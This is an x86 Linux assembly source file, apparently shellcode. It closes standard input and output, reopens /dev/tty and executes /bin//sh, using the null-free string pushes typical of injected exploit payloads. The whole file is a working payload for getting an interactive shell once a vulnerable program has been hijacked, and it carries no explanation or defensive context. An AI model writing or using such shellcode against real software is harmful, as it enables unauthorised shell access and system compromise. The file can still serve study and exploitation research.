        /* reopen.s */
        .intel_syntax noprefix
        .globl _start
_start:
        /* close(0) */
        xor edx, edx
        xor ebx, ebx
        lea eax, [edx+6]
        int 0x80
        /* close(1) */
        inc ebx
        lea eax, [edx+6]
        int 0x80
        /* open("/dev/tty", O_RDWR) */
        lea ecx, [edx+2]
        push edx
        push 0x7974742f
        push 0x7665642f
        mov ebx, esp
        lea eax, [edx+5]
        int 0x80
        /* open("/dev/tty", O_RDWR) */
        lea eax, [edx+5]
        int 0x80
        /* execve("/bin//sh", {"/bin//sh", NULL}, NULL) */
        xor edx, edx
        push edx
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push edx
        push ebx
        mov ecx, esp
        lea eax, [edx+11]
        int 0x80
